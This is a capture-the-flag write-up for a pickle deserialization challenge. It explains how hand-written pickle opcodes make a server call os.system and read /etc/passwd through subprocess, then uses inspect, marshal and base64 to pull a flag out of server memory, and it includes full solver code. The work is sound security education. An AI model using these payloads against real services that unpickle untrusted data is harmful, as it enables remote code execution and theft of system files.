Pickle allows a very unusual deserialization option - we can write a function `__reduce__()` in a class, and from this function return a tuple with:
- function
- tuple with parameters for this function
Pickle when deserializing such object will call given function with those parameters.
This means that we can, theoretically, call any function with any set of parmeters on the server side. In particular, we could call for example `os.system("command")`!
Pickle has some internal security which prevents from using some functions, however the format of pickle output is so simple that we can just write it by hand.
Pickle calling `os.system("ls")` can look like this:
```
cos
system
(S'ls'
tR.
```
Pickle executes this on a stack machine. The code above is interpreted as:
`cos\nsystem` - push function `system` imported from module `os` on the stack
`(` - push a marker on the stack
`S'ls'` - push a string `ls` on the stack
`t` - pop everything from the stack until a marker is reached, put all those elements in a tuple and push this tuple to the stack
`R` - pop two elements from the stack, first one is arguments tuple and the second one is a function that should be called with those arguments, push result of the function on the stack
Additional operations we will use to solve this task:
`I123` - push an integer 123 ono the stack
`)` - push empty tuple on the stack
`d` - pop everyting from the stack until maker is reached, push a dictionary built with the values poped
The newline characters in the code are necessary! We can, of course, do cascade function calls, for example:
`os.write(1, subprocess.check_output("cat /etc/passwd"))` 
can be written as:
```
cos
write
(I1
csubprocess
check_output
(S'cat /etc/passwd'
tRtR.
```
We can call pretty much any code on the remote machine, as long as the function exists on the target machine. Now we need to figure out how exactly we can get the flag.
We could read the flag from the socket, just as server code does, however this is restricted by kernel functions block. Therefore, we need to get the flag from memory of the server script.
We will use the `inspect` package which is available on the server. Is allows us to use `inspect.currentframe()`, `inspect.getouterframes()` and `inspect.getmembers()`.
First one returns current stack frame. Second returns list of information on the stack frames above our frame (including the frame itself, line of code, script path etc).
The third one returns data extracted from the given frame.
We want to call a cascade `inspect.getouterframes(inspect.currentframe())` to get list of frames informations regarding frames above our current frame, and in particular there will be a frame with server code which contains a loaded `flag`. By printing elements of this list we can find out that the frame we are interested in is a third element of the list, and the frame itself is the first element of tuple. So we need:
```python
current_frame = inspect.currentframe()
outer_frames = inspect.getouterframes(current_frame)
frame_with_flag = outer_frames[3][0]
```
Or written shorter: `inspect.getouterframes(inspect.currentframe())[3][0]`
Next we use `inspect.getmembers()` to get informations about the frame, where we can find also global variables in this frame, including our flag.
Server limits the output we can get so we need to test this locally to dig into the returned structure and find where the flag will be. We figure out that from `getmemebers` call we need 6th element from the end of the list, from this we need element of index 1 and we should get a dictionary of global variables. The flag variable is called `flag` and is an object of a class with field `flag`. So we need:
```python
framedata = inspect.getmembers(frame_with_flag)
flag_value = framedata[-6][1]['flag'].flag
```
So a short cascade: `os.write(1,inspect.getmembers(inspect.getouterframes(inspect.currentframe())[3][0])[-6][1]['flag'].flag)`
We bump into a complication - the list indexing and taking a dictionary value by key are not available to us (because for example `list` module is not imported on the server). 
However there are `marshal`, `types` and `base64` availble. We can use them to serialize and deserialize bytecode of a python function.
We can make a printable string from a function and then recreate this function from string, and call it!
```python
import base64
import marshal
import types
def fun(arg):
    print('test ' + arg)
marshaled_bytecode = marshal.dumps(fun.func_code)
printable_string = base64.b64encode(marshaled_bytecode)
print(printable_string)
decoded_bytecode = base64.b64decode(printable_string)
recovered_code = marshal.loads(decoded_bytecode)
callable_function = types.FunctionType(recovered_code, {}, "")
callable_function("argument")
```
Code above presnts how we can make a printable string with a "function" and then how to recreate it. It's easy to see that this requires a cascade:
`types.FunctionType(marshal.loads(base64.b64decode("base64 code")),{},"")`
The reason for all those cascades I wrote is because they can be written as pickle very easily:
```
ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'base64 code'
tRtR(dS''
))tR
```
When we deserialize this with pickle on the stack there will be our own function passed as string.
We can use this technique and create functions with missing `frames[3][0]` and `frame_data[-6][1]['flag'].flag` operations, make a base64 printable string from them and then place a deserialize code in pickle. The final solution for this task was (whole solver available [here](solver.py)):
```python
def fun1(frames):
    return frames[3][0]
def fun2(frames_data):
    return frames_data[-6][1]['flag'].flag
code1 = base64.b64encode(marshal.dumps(fun1.func_code))
code2 = base64.b64encode(marshal.dumps(fun2.func_code))
class Flag(object):
    pass
data = "cos\nwrite\n(I1\nctypes\nFunctionType\n(cmarshal\nloads\n(cbase64\nb64decode\n(S'"+code2+"'\ntRtR(dS''\n))tR(cinspect\ngetmembers\n(ctypes\nFunctionType\n(cmarshal\nloads\n(cbase64\nb64decode\n(S'"+code1+"'\ntRtR(dS''\n(t(ttR(cinspect\ngetouterframes\n(cinspect\ncurrentframe\n)RtRtRtRtRtR."
```
Which gives us a pickle:
```
cos
write
(I1
ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'YwEAAAABAAAAAgAAAEMAAABzEwAAAHwAAGQBABlkAgAZZAMAGWoAAFMoBAAAAE5p+v///2kBAAAAdAQAAABmbGFnKAEAAABSAAAAACgBAAAAdAsAAABmcmFtZXNfZGF0YSgAAAAAKAAAAABzRAAAAEM6L1VzZXJzL1BoYXJpc2FldXMvUHljaGFybVByb2plY3RzL3VudGl0bGVkL3NyYy8zMmMzL2d1cmtlL2d1cmtlLnB5dAQAAABmdW4yEAAAAHMCAAAAAAE='

```
And sending it to the server we get the flag: `32c3_rooDahPaeR3JaibahYeigoong`
